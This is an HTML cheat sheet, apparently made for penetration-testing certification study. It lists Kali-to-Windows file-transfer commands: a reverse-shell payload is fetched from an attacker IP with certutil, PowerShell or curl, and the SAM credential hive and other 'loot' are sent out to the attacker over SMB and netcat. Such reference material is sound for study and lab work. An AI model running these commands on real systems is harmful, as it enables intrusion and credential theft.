@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>File Transfer — Red</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0D1117;--panel:#161B22;--panel2:#1C2230;--line:#2A3140;--txt:#E6EDF3;--mut:#8B949E;--dim:#6E7681;--g1:#39D353;--g2:#26A641;--g3:#006D32;--red:#F04A4A;--amber:#E3B341;--blue:#58A6FF;}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--txt);font-family:Inter,system-ui,sans-serif;line-height:1.55;padding:26px 16px 70px}
+  .wrap{max-width:900px;margin:0 auto}.mono{font-family:'JetBrains Mono',monospace}
+  header{display:flex;align-items:center;gap:16px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:20px;margin-bottom:20px}
+  .mark{width:50px;height:50px;flex:0 0 auto}
+  h1{font-size:24px;font-weight:700;letter-spacing:-.3px}
+  .sub{color:var(--mut);font-size:13px;margin-top:2px}.sub b{color:var(--g1);font-weight:600}
+  .model{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 18px;margin-bottom:18px;font-size:14px;color:var(--mut)}
+  .model b{color:var(--txt);font-weight:600}.model .big{color:var(--g1);font-weight:600}
+  .search{width:100%;background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:12px 14px;color:var(--txt);font-size:15px;font-family:inherit;margin-bottom:10px}
+  .search:focus{outline:none;border-color:var(--g2)}
+  .count{font-size:12px;color:var(--dim);margin-bottom:18px}
+  .sec{font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--mut);margin:22px 0 12px;display:flex;align-items:center;gap:8px}
+  .sec .dot{width:7px;height:7px;border-radius:50%;background:var(--g1)}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;overflow:hidden}
+  .card.hidden{display:none}
+  .chead{display:flex;align-items:center;gap:12px;padding:15px 18px;cursor:pointer;user-select:none}
+  .chead:hover{background:var(--panel2)}
+  .tag{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:13px;color:var(--g1);background:rgba(57,211,83,.12);padding:3px 10px;border-radius:7px;white-space:nowrap}
+  .tag.r{color:var(--red);background:rgba(240,74,74,.12)}.tag.b{color:var(--blue);background:rgba(88,166,255,.12)}.tag.a{color:var(--amber);background:rgba(227,179,65,.12)}
+  .cname{flex:1;font-weight:600;font-size:15px}.cname small{display:block;color:var(--mut);font-size:12.5px;font-weight:400;margin-top:1px}
+  .chev{color:var(--dim);transition:transform .15s;font-size:13px}.card.open .chev{transform:rotate(90deg)}
+  .cbody{display:none;padding:0 18px 18px;border-top:1px solid #20262F}.card.open .cbody{display:block}
+  .cbody .when{font-size:13.5px;color:var(--mut);margin:12px 0 10px}.cbody .when b{color:var(--txt)}
+  .cmd{position:relative;background:#0B0E13;border:1px solid var(--line);border-radius:8px;padding:10px 40px 10px 12px;margin:8px 0;font-family:'JetBrains Mono',monospace;font-size:12.5px;color:var(--g1);overflow-x:auto;white-space:pre}
+  .copy{position:absolute;top:7px;right:7px;background:#20262F;border:none;color:var(--mut);font-size:11px;padding:3px 8px;border-radius:5px;cursor:pointer;font-family:inherit}
+  .copy:hover{color:var(--txt);background:#2A3140}.copy.done{color:var(--g1)}
+  .foot{margin-top:28px;text-align:center;color:var(--dim);font-size:12px;line-height:1.7;border-top:1px solid var(--line);padding-top:18px}
+  .empty{text-align:center;color:var(--dim);padding:30px;font-size:14px;display:none}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <svg class="mark" viewBox="0 0 100 100" aria-label="Red logo">
+      <rect width="100" height="100" rx="18" fill="#0D1117" stroke="#2A3140"/>
+      <rect x="24" y="16" width="10" height="10" rx="2" fill="#39D353"/><rect x="36" y="16" width="10" height="10" rx="2" fill="#39D353"/><rect x="48" y="16" width="10" height="10" rx="2" fill="#39D353"/><rect x="60" y="16" width="10" height="10" rx="2" fill="#39D353"/>
+      <rect x="24" y="28" width="10" height="10" rx="2" fill="#26A641"/><rect x="72" y="28" width="10" height="10" rx="2" fill="#26A641"/>
+      <rect x="24" y="40" width="10" height="10" rx="2" fill="#26A641"/><rect x="72" y="40" width="10" height="10" rx="2" fill="#26A641"/>
+      <rect x="24" y="52" width="10" height="10" rx="2" fill="#006D32"/><rect x="36" y="52" width="10" height="10" rx="2" fill="#006D32"/><rect x="48" y="52" width="10" height="10" rx="2" fill="#006D32"/><rect x="60" y="52" width="10" height="10" rx="2" fill="#006D32"/>
+      <rect x="24" y="64" width="10" height="10" rx="2" fill="#0E4429"/><rect x="48" y="64" width="10" height="10" rx="2" fill="#0E4429"/>
+      <rect x="24" y="76" width="10" height="10" rx="2" fill="#0E4429"/><rect x="60" y="76" width="10" height="10" rx="2" fill="#F04A4A"/>
+    </svg>
+    <div><h1>File Transfer</h1><div class="sub">Kali ↔ Windows &middot; <b>tap to open</b> &middot; Red</div></div>
+  </header>
+  <div class="model"><b>The rule:</b> the <b>server always runs on Kali</b>. Direction = <span class="big">who is downloading</span>. Kali&rarr;Windows = pull a tool TO the target. Windows&rarr;Kali = push loot OUT. <b>Traps:</b> http:// forward slashes vs \\ backslashes in UNC paths &middot; start the server FIRST &middot; fresh AttackBox = new IP &middot; modern Windows blocks anonymous SMB (use -user/-password).</div>
+  <input class="search" id="q" placeholder="Search commands, keywords...">
+  <div class="count" id="count"></div>
+  <div id="root"></div>
+  <div class="empty" id="empty">Nothing matches that search.</div>
+  <div class="foot">
+    Built by Red as part of my PNPT prep &mdash; from running the tools myself. Built with AI assistance for formatting and this interactive map.<br>
+    Licensed CC BY-NC 4.0 &mdash; free to use and share with credit, not for sale.
+  </div>
+</div>
+<script>
+const SECTIONS = [{"title": "Kali \u2192 Windows (download TO target)", "items": [{"tag": "http", "name": "HTTP download", "sub": "Kali hosts, Windows pulls", "when": "<b>Simplest.</b> Start the server on Kali, pull from the target with certutil.", "cmds": ["# on Kali", "python3 -m http.server 80", "# on Windows", "certutil -urlcache -split -f http://KALI_IP/rev.exe C:\\Users\\user\\rev.exe"], "kw": "http certutil download"}, {"tag": "PowerShell", "tagc": "b", "name": "iwr / curl", "sub": "when certutil is blocked", "when": "Alternate pull methods.", "cmds": ["powershell iwr -Uri http://KALI_IP/rev.exe -OutFile rev.exe", "curl http://KALI_IP/rev.exe -o rev.exe"], "kw": "powershell invoke-webrequest curl"}]}, {"title": "Windows \u2192 Kali (push loot OUT)", "items": [{"tag": "SMB", "name": "SMB server", "sub": "steal files to Kali", "when": "Push loot (SAM/SYSTEM hives) back. <b>Modern Windows needs auth</b> \u2014 run with -user/-password.", "cmds": ["# on Kali", "impacket-smbserver share . -smb2support -user red -password red", "# on Windows", "net use \\\\KALI_IP\\share /user:red red", "copy C:\\Windows\\Repair\\SAM \\\\KALI_IP\\share\\"], "kw": "smb impacket smbserver net use copy loot"}, {"tag": "nc", "tagc": "a", "name": "netcat / base64", "sub": "backup when SMB fails", "when": "Fallbacks when SMB is blocked.", "cmds": ["nc -lvnp 4444 > loot   # Kali listens", "nc KALI_IP 4444 < loot   # Windows sends", "certutil -encode file b64.txt   # small files as text"], "kw": "netcat base64 certutil backup"}]}];
+function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+function escA(s){return esc(s).replace(/"/g,"&quot;");}
+function card(t){
+  const cmds=(t.cmds||[]).map(c=>`<div class="cmd">${esc(c)}<button class="copy" data-c="${escA(c)}">copy</button></div>`).join("");
+  const kw=((t.name||'')+' '+(t.sub||'')+' '+(t.kw||'')+' '+(t.cmds||[]).join(' ')).toLowerCase();
+  return `<div class="card" data-kw="${escA(kw)}"><div class="chead"><span class="tag ${t.tagc||''}">${esc(t.tag)}</span><span class="cname">${esc(t.name)}<small>${esc(t.sub||'')}</small></span><span class="chev">&#9654;</span></div><div class="cbody"><div class="when">${t.when||''}</div>${cmds}</div></div>`;
+}
+let htmlOut="";
+SECTIONS.forEach(s=>{htmlOut+=`<div class="sec"><span class="dot"></span> ${esc(s.title)}</div>`+s.items.map(card).join("");});
+document.getElementById("root").innerHTML=htmlOut;
+const cards=Array.from(document.querySelectorAll(".card"));
+const countEl=document.getElementById("count");
+function uc(n){countEl.textContent=n+" item"+(n===1?"":"s")+" shown";}
+uc(cards.length);
+document.addEventListener("click",function(e){
+  const cb=e.target.closest(".copy");
+  if(cb){e.stopPropagation();const tx=cb.getAttribute("data-c");try{navigator.clipboard.writeText(tx);}catch(_){const ta=document.createElement("textarea");ta.value=tx;document.body.appendChild(ta);ta.select();try{document.execCommand("copy");}catch(e2){}document.body.removeChild(ta);}cb.textContent="copied";cb.classList.add("done");setTimeout(()=>{cb.textContent="copy";cb.classList.remove("done");},1200);return;}
+  const h=e.target.closest(".chead");if(h){h.parentElement.classList.toggle("open");}
+});
+const q=document.getElementById("q"),empty=document.getElementById("empty");
+q.addEventListener("input",function(){const term=q.value.trim().toLowerCase();let shown=0;cards.forEach(c=>{const m=!term||c.getAttribute("data-kw").indexOf(term)>-1;c.classList.toggle("hidden",!m);if(m)shown++;if(term&&m)c.classList.add("open");else if(term&&!m)c.classList.remove("open");});uc(shown);empty.style.display=shown===0?"block":"none";});
+</script>
+</body>
+</html>
